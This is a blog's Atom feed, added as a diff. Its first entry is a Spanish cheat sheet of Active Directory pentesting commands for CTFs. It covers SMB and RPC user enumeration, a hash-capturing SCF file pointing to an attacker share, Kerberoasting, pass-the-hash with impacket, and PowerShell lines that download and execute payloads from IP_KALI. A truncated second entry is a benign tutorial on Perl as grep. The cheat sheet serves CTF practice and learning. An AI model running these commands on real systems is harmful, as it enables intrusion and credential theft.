@@ -1,0 +1,472 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-14T21:46:19-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">spoNge</title><subtitle>Nothing</subtitle><author><name>Simon Uzcategui &lt;br&gt; spoNge369</name><email>gamingingeniero@gmail.com</email></author><entry><title type="html">Active Directory - CTFs</title><link href="http://localhost:4000/winAD/" rel="alternate" type="text/html" title="Active Directory - CTFs" /><published>2022-04-14T00:00:00-04:00</published><updated>2022-04-14T00:00:00-04:00</updated><id>http://localhost:4000/winAD</id><content type="html" xml:base="http://localhost:4000/winAD/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/winAD/tuxbreak.jpg&quot; width=&quot;700&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Esta sera una lista de comandos para el Pentesting en entornos de Directorio Activo.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;nmap -sCV -p80 ... -oA nmap
+xsltproc nmap.xml
+php -S 0.0.0.0:80
+
+
+xsltproc -o scan.html bootstrap-net.xsl nmap.xml
+php -S 0.0.0.0:80&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; ... &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap
+xsltproc nmap.xml
+php &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 0.0.0.0:80
+
+
+xsltproc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; scan.html bootstrap-net.xsl nmap.xml
+php &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 0.0.0.0:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;port-21---ftp&quot;&gt;Port 21 - ftp&lt;/h2&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;ftp IP_BOX #user:anonymous, password:ninguna
+ftp&amp;gt; prompt off
+ftp&amp;gt; mget *&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp IP_BOX &lt;span class=&quot;c&quot;&gt;#user:anonymous, password:ninguna&lt;/span&gt;
+ftp&amp;gt; prompt off
+ftp&amp;gt; mget &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;port-25---smtp&quot;&gt;Port 25 - smtp&lt;/h2&gt;
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;#seclist-&amp;gt;usershort.txt
+perl -wnlE&amp;#39;print &amp;quot;$_\@domain&amp;quot;&amp;#39; usershort.txt &amp;gt; users.txt
+smtp-user-enum -M RCPT -U users.txt -t IP_BOX&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#seclist-&amp;gt;usershort.txt&lt;/span&gt;
+perl &lt;span class=&quot;nt&quot;&gt;-wnlE&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;print &quot;$_\@domain&quot;&apos;&lt;/span&gt; usershort.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
+smtp-user-enum &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; RCPT &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; IP_BOX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;port-445---smb&quot;&gt;Port 445 - smb&lt;/h2&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; IP_BOX &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; IP_BOX &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;guest&apos;&lt;/span&gt;
+rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; IP_BOX &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;rpcclient -U &amp;quot;&amp;quot; IP_BOX -N -c&amp;quot;querydispinfo&amp;quot; | perl -M&amp;#39;Term::ANSIColor qw(:constants)&amp;#39; -wnlE&amp;#39;!/Desc:.+null/i and /(Account: .+).+(Name: .+).+(Desc: .+)/gi and print RED &amp;quot;\n$1&amp;quot;, BLUE, &amp;quot;\n$2&amp;quot;, GREEN, &amp;quot;\n$3&amp;quot;&amp;#39;&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; IP_BOX &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;querydispinfo&quot;&lt;/span&gt; | perl &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Term::ANSIColor qw(:constants)&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-wnlE&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;!/Desc:.+null/i and /(Account: .+).+(Name: .+).+(Desc: .+)/gi and print RED &quot;\n$1&quot;, BLUE, &quot;\n$2&quot;, GREEN, &quot;\n$3&quot;&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;rpcclient -U &amp;quot;&amp;quot; IP_target -N -c &amp;quot;enumdomusers&amp;quot; | perl -wnlE&amp;#39;print $1 if/\[(\w+)\]/gi&amp;#39; &amp;gt; users.txt&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; IP_target &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers&quot;&lt;/span&gt; | perl &lt;span class=&quot;nt&quot;&gt;-wnlE&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;print $1 if/\[(\w+)\]/gi&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs &lt;span class=&quot;s2&quot;&gt;&quot;//IP_BOX/Dir_share&quot;&lt;/span&gt; /mnt/mountAD
+tree &lt;span class=&quot;nt&quot;&gt;-fas&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;users.txt | perl &lt;span class=&quot;nt&quot;&gt;-wnlE&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;print $1 if/Users\/(\w+)/gi&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
+perl &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Term::ANSIColor qw(:constants)&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-wnlE&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;my $payload = `smbcacls \&quot;//IP_BOX/Dir_shares\&quot; /mnt/mountAD/Dir_share/Users/$_ -N`;print(BOLD BLUE &quot;Usuario: $_&quot;, RED &quot;\n$payload&quot;) if $payload=~/Everyone.*FULL/gi&apos;&lt;/span&gt; users.txt
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-smbserver share &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
+PS&amp;gt; copy data.zip &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;IP_BOX&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;hare&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;ata.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;evilscf&quot;&gt;Evil.scf&lt;/h3&gt;
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;[Shell]
+Command=2
+IconFile=\\IP_KALI\share\xd.ico
+[Taskbar]
+Command=ToggleDesktop&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Shell]
+&lt;span class=&quot;nv&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
+&lt;span class=&quot;nv&quot;&gt;IconFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;IP_KALI&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;hare&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;d.ico
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Taskbar]
+&lt;span class=&quot;nv&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ToggleDesktop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb IP_BOX
+crackmapexec smb IP_BOX &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;P@$$w0rd!&apos;&lt;/span&gt;
+crackmapexec winrm IP_BOX &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;P@$$w0rd!&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;domain\user%P@$$w0rd!&apos;&lt;/span&gt; IP_BOX &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;enumdomusers&apos;&lt;/span&gt;
+rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;domain\user%P@$$w0rd!&apos;&lt;/span&gt; IP_BOX &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;queryuser &amp;lt;rid&amp;gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;enumdomgroups&apos;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;querygroupmem &amp;lt;rid&amp;gt;&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;P@$$w0rd!&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;rpcclient -U &amp;#39;domain/user%P@$$w0rd!&amp;#39; IP_BOX -c&amp;quot;enumdomusers&amp;quot; | perl -wnE&amp;#39;say $1 if/\[(\w+)\]/gi&amp;#39; &amp;gt; users.txt
+impacket-GetNPUsers domain/ -no-pass -usersfile users.txt
+impacket-GetUserSPNs domain/user:&amp;#39;P@$$w0rd!&amp;#39; -request
+-dc-ip 127.0.0.1&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;domain/user%P@$$w0rd!&apos;&lt;/span&gt; IP_BOX &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers&quot;&lt;/span&gt; | perl &lt;span class=&quot;nt&quot;&gt;-wnE&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;say $1 if/\[(\w+)\]/gi&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
+impacket-GetNPUsers domain/ &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; users.txt
+impacket-GetUserSPNs domain/user:&lt;span class=&quot;s1&quot;&gt;&apos;P@$$w0rd!&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-request&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;impacket-psexec domain/user:&amp;#39;Passw0rd!&amp;#39;@IP_BOX cmd.exe
+impacket-wmiexec domain/user@IP_BOX -hashes LMHASH:NTHASH&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec domain/user:&lt;span class=&quot;s1&quot;&gt;&apos;Passw0rd!&apos;&lt;/span&gt;@IP_BOX cmd.exe
+impacket-wmiexec domain/user@IP_BOX &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; LMHASH:NTHASH
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;powershell&quot;&gt;Powershell&lt;/h2&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IEX&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://IP_KALI/sponge.ps1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+wget http://IP_KALI/sponge.exe &lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; sponge.exe
+iwr &lt;span class=&quot;nt&quot;&gt;-uri&lt;/span&gt; http://IP_KALI/sponge.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; sponge.exe
+certutil &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; http://IP_KALI/sponge.exe sponge.exe
+curl http://IP_KALI/sponge.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; sponge.exe
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://IP_KALI/sponge.exe&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;sponge.exe&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;$ExecutionContext.SessionState.LanguageMode&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;bp&quot;&gt;$ExecutionContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SessionState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;LanguageMode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>spoNge</name></author><category term="winAD" /><category term="AD" /><category term="AD" /><summary type="html">Comandos utiles para Pentesting en AD</summary></entry><entry><title type="html">Perl as a Better grep - Linux</title><link href="http://localhost:4000/perlbettergrep/" rel="alternate" type="text/html" title="Perl as a Better grep - Linux" /><published>2021-09-19T00:00:00-04:00</published><updated>2021-09-19T00:00:00-04:00</updated><id>http://localhost:4000/perlbettergrep</id><content type="html" xml:base="http://localhost:4000/perlbettergrep/">&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$&amp;gt;&lt;/code&gt; -&amp;gt; terminal.&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&amp;gt;&lt;/code&gt; -&amp;gt; terminal con acceso root.&lt;/p&gt;
+
+&lt;h2 id=&quot;contrapartes-de-grep-en-perl&quot;&gt;Contrapartes de grep en Perl&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$&amp;gt;perl -wnl -e &apos;code&apos; file&lt;/code&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;grep&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Perl&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Uso&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep &apos;RE&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -wnl -e &apos;/RE/ and print;&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Imprime la linea donde esta ‘RE’ dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -v &apos;RE&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -wnl -e &apos;/RE/ or  print;&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Imprime la linea donde NO esta ‘RE’ dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -i &apos;RE&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -wnl -e &apos;/RE/i and print;&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i&lt;/code&gt;nsensitive&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -l &apos;RE&apos; file1 file2&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -wnl -e &apos;/RE/ and print $ARGV and close ARGV;&apos; file1 file2&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Imprime los archivos donde encuentre la coincidencia&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgrep &apos;string&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -wnl -e &apos;/\Qstring\E/ and print&apos;; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;egrep &apos;RE&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl -wnl -e &apos;/RE/ and print;&apos; file&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RE&lt;/code&gt;: Expresion Regular, que es una cadena de caracteres que define un patron, pueden ser simples caracteres literales o metacaracteres.&lt;/p&gt;
+
+&lt;h2 id=&quot;parametros-perl&quot;&gt;Parametros perl&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w:&lt;/code&gt; Habilitar las warnings.&lt;br /&gt;
+ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n:&lt;/code&gt; Processing input - Bucle que recorre cada linea de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; y cuyo bloque es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code&lt;/code&gt;.&lt;br /&gt;
+ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l:&lt;/code&gt; Un salto de linea para cada registro de salida.&lt;br /&gt;
+ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e &apos;code&apos;:&lt;/code&gt; Execute el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code&lt;/code&gt;.&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;files-de-pruebas&quot;&gt;files de pruebas&lt;/h2&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;direcciones.txt
+Halchal Punter:1234 Disk Drive:Milpitas:ca:95035
